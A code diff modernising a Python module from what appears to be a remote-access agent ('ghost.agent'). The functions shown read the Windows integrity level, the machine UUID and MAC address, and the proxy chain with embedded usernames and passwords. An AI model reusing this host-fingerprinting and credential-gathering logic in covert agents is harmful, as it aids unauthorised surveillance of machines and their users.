@@ -1,9 +1,5 @@
 # -*- coding: utf-8 -*-
 
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
-from __future__ import unicode_literals
 
 import platform
 import getpass
@@ -15,26 +11,6 @@ import socket
 import ghost.agent as ghost
 
 
-
-def _as_unicode(x):
-    if isinstance(x, bytes):
-        try:
-            return x.decode(sys.getfilesystemencoding())
-        except UnicodeError:
-            try:
-                return x.decode('UTF-8')
-            except UnicodeError:
-                return x.decode('latin1')
-
-    return x
-
-
-# Restore write/stdout/stderr
-
-
-if not hasattr(os, 'real_write'):
-    if type(os.write).__name__ == 'builtin_function_or_method':
-        setattr(os, 'real_write', os.write)
 
 
 allowed_std = ('file', 'Blackhole', 'NoneType')
@@ -49,14 +25,13 @@ if not hasattr(sys, 'real_stderr') and type(
         sys.stderr).__name__ in allowed_std:
     setattr(sys, 'real_stderr', sys.stderr)
 
-
 if not hasattr(sys, 'real_stdin') and type(
         sys.stdin).__name__ in allowed_std:
     setattr(sys, 'real_stdin', sys.stdin)
 
 
 if not hasattr(os, 'stdout_write'):
-    def stdout_write(fd, s):
+    def stdout_write(s, fd=1):
         if fd == 1:
             return sys.stdout.write(s)
         elif fd == 2:
@@ -211,8 +186,7 @@ def get_integrity_level():
         if dwLastError != ERROR_INSUFFICIENT_BUFFER:
 
             logging.error(
-                'GetTokenInformation(): Unknown error: %d',
-                dwLastError
+                f'GetTokenInformation(): Unknown error: {dwLastError}'
             )
             return None
 
@@ -224,8 +198,7 @@ def get_integrity_level():
                 info_size, ctypes.byref(info_size)):
 
             logging.error(
-                'GetTokenInformation(): Unknown error with buffer size %d: %d',
-                info_size.value, GetLastError()
+                f'GetTokenInformation(): Unknown error with buffer size {info_size.value}: {GetLastError()}'
             )
             return None
 
@@ -235,7 +208,7 @@ def get_integrity_level():
         )
         value = res.contents.value
 
-        return mapping.get(value) or u'0x%04x' % value
+        return mapping.get(value) or f'0x{value:04x}'
 
     finally:
         CloseHandle(token)
@@ -439,7 +412,7 @@ def get_uuid():
         pass
 
     try:
-        node = '{:012x}'.format(uuid.getnode())
+        node = f'{uuid.getnode():012x}'
         macaddr = ':'.join(node[i:i+2] for i in range(0, 12, 2))
     except Exception:
         pass
@@ -469,13 +442,8 @@ def get_uuid():
                 'proxies', []):
             try:
                 proxy = ' -> '.join(
-                    '{}://{}{}'.format(
-                        proxy.type,
-                        '{}:{}@'.format(
-                            proxy.username, proxy.password
-                        ) if proxy.username or proxy.password else '',
-                        proxy.addr
-                    ) for proxy in ghost.client.connection_info['proxies']
+                    f'{proxy.type}://{f"{proxy.username}:{proxy.password}@" if proxy.username or proxy.password else ""}{proxy.addr}'
+                    for proxy in ghost.client.connection_info['proxies']
                 )
             except Exception as e:
                 proxy = str(e)
